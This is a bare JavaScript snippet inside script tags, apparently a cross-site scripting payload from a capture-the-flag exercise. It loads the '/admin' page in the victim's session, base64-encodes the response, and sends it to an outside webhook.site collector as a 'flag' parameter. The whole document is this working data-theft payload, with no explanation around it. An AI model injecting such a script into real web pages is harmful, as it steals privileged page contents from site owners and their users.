<script>
  fetch('/admin')
  .then(r => r.text())
  .then(data => fetch('https://webhook.site/xxx?flag=' + btoa(data)))
</script>
